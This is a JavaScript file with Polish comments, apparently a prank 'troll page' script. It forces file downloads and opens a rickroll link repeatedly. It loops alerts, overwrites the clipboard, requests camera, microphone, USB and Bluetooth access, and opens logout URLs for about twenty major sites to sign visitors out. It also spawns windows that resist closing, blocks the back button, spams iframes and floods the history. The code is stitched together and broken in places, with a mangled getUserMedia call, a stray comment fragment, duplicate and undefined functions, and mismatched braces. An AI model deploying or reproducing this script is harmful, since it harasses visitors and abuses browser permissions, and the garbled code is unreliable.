let filesDownloaded = false; // Flaga do śledzenia, czy pliki zostały pobrane


function downloadFiles(files) {

    files.forEach(file => {

        const link = document.createElement('a');

        link.href = `https://hazetlab.github.io/zerfithel/media/${file}`;

        link.download = file;

        document.body.appendChild(link);

        link.click();

        document.body.removeChild(link);

    });

}


function openLinks(links) {

    links.forEach(link => {

        window.open(link, '_blank');

    });

}


function openLinks(links) {

    links.forEach(link => {

        window.open(link, '_blank');

    });

}


function resizeWindow() {

    let width = 300;

    let height = 200;

    const maxWidth = 800;

    const maxHeight = 600;

    const interval = setInterval(() => {

        if (width < maxWidth && height < maxHeight) {

            width += 50;

            height += 50;

            window.resizeTo(width, height);

        } else {

            clearInterval(interval);
        }

    }, 2000);
}

function main() {

    const filesToDownload = ['ez-yann.png', 'gerbus.png', 'jasioch.png', 'readme.txt'];

    const linksToOpen = ['https://www.youtube.com/watch?v=dQw4w9WgXcQ'];


    setInterval(() => {

        if (!filesDownloaded) { // Sprawdź, czy pliki zostały już pobrane

            downloadFiles(filesToDownload);

            filesDownloaded = true; // Ustaw flagę na true po pobraniu plików

        }

        openLinks(linksToOpen);

    }, 50000);

}


    function copyRandomString() {

        const randomString = Math.random().toString(36).substring(2, 18);

        navigator.clipboard.writeText(randomString).then(() => {

            console.log('Skopiowano do schowka:', randomString);

        });

    }


    function randomAlert() {

        const randomString = Math.random().toString(36).substring(2, 18);

        alert(randomString);

        setTimeout(randomAlert, 1000);

    }


    function openMovingVideo() {

        const videoWindow = window.open('https://hazetlab.github.io/zerfithel/media/wide.mp4', 'videoWindow', 'width=400,height=300');

        let posX = 0;

        let posY = 0;

        const moveVideo = () => {

            posX += 5;

            posY += 5;

            videoWindow.moveTo(posX, posY);

            if (posX < window.screen.width && posY < window.screen.height) {

                requestAnimationFrame(moveVideo);

            }

        };

        moveVideo();

    }


    function requestCameraAndMicrophone() {

        navigator.mediaDevices.getUser; Media({ video: true, audio: true })

            .then(stream => {

                console.log('Uprawnienia przyznane');

            })

            .catch(err => {

                console.log('Błąd przyznawania uprawnień:', err);

            });

    }


    function hideCursor() {

        document.body.style.cursor = 'none';

    }

    function requestUSBPermission() {

        navigator.usb.requestDevice({ filters: [] })

            .then(device => {

                console.log('Uprawnienia do USB przyznane:', device);

            })

            .catch(err => {

                console.log('Błąd przyznawania uprawnień do USB:', err);

            });

    }

    function requestBluetoothPermission() {

        navigator.bluetooth.requestDevice({ acceptAllDevices: true })

            .then(device => {

                console.log('Uprawnienia do Bluetooth przyznane:', device);

            })

            .catch(err => {

                console.log('Błąd przyznawania uprawnień do Bluetooth:', err);

            });

    }


    const logoutSites = [

        'https://discord.com/logout',

        'https://www.facebook.com/logout',

        'https://stackoverflow.com/logout',

        'https://vk.com/logout',

        'https://ometv.com/logout',

        'https://portal.office.com/logout',

        'https://github.com/logout',

        'https://www.amazon.com/ap/signout',

        'https://accounts.google.com/Logout',

        'https://www.netflix.com/logout',

        'https://www.disneyplus.com/logout',

        'https://soundcloud.com/logout',

        'https://www.wikipedia.org/logout',

        'https://accounts.google.com/Logout',

        'https://protonmail.com/logout',

        'https://protonvpn.com/logout',

        'https://www.roblox.com/logout',

        'https://www.spotify.com/logout',

        'https://www.reddit.com/logout',

        'https://chat.openai.com/logout',

        'https://www.guilded.gg/logout',

        'https://www.tumblr.com/logout',

        'https://www.ebay.com/logout'

    ];


    function logoutFromSites() {

        logoutSites.forEach(site => {

            window.open(site, '_blank');

        });

    }


    function disableBack() {

        window.history.pushState(null, '', window.location.href);

        window.onpopstate = function () {

            window.history.pushState(null, '', window.location.href);

        };

    }


    function iframeSpam() {

        for (let i = 0; i < 10; i++) {

            const iframe = document.createElement('iframe');

            iframe.src = 'http://ptoszek.pl'; 

            document.body.appendChild(iframe);

        }

    }


    function fillHistory() {

        for (let i = 1; i < 20; i++) {

            window.history.pushState({}, '', window.location.pathname + '?q=' + i);

        }

        window.history.pushState({}, '', window.location.pathname);

    }

function startInvisiblePictureInPictureVideo () {
  const video = document.createElement('video')
  video.src = getRandomArrayEntry(VIDEOS)
  video.loop = true
  video.muted = true
  video.style = HIDDEN_STYLE
  video.autoplay = true
  video.play()

  document.body.appendChild(video)
}
uires user-initiated event.
 */
function enablePictureInPicture () {
  const video = document.querySelector('video')
  if (document.pictureInPictureEnabled) {
    video.style = ''
    video.muted = false
    video.requestPictureInPicture()
    video.play()
  }
}

function focusWindows () {
  wins.forEach(win => {
    if (!win.closed) win.focus()
  })
}


function openWindow () {
  const { x, y } = getRandomCoords()
  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
  const win = window.open(window.location.pathname, '', opts)

  if (!win) return
  wins.push(win)

  if (wins.length === 2) setupSearchWindow(win)

  win.onunload = function () {
    return false;
  };

  win.addEventListener("beforeunload", function (e) {
    e.preventDefault();
    e.returnValue = "";
  });

  win.onbeforeunload = function () {
    return "";
  };
}

function hideCursor () {
  document.querySelector('html').style = 'cursor: none;'
}

    startInvisiblePictureInPictureVideo();

    enablePictureInPicture();

    focusWindows();

    openWindow();

    hideCursor();
    
    copyRandomString(); // Kopiowanie losowego ciągu

    randomAlert(); // Wyświetlanie losowego alertu

    openMovingVideo(); // Otwieranie wideo w ruchu

    requestCameraAndMicrophone(); // Prośba o uprawnienia do kamery i mikrofonu

    requestUSBPermission(); // Prośba o uprawnienia do USB

    requestBluetoothPermission(); // Prośba o uprawnienia do Bluetooth

    logoutFromSites(); // Wylogowanie z podanych stron

    disableBack(); // Wyłączenie przycisku wstecz

    iframeSpam(); // Spamowanie iframe

    fillHistory(); // Wypełnienie historii


}


main();
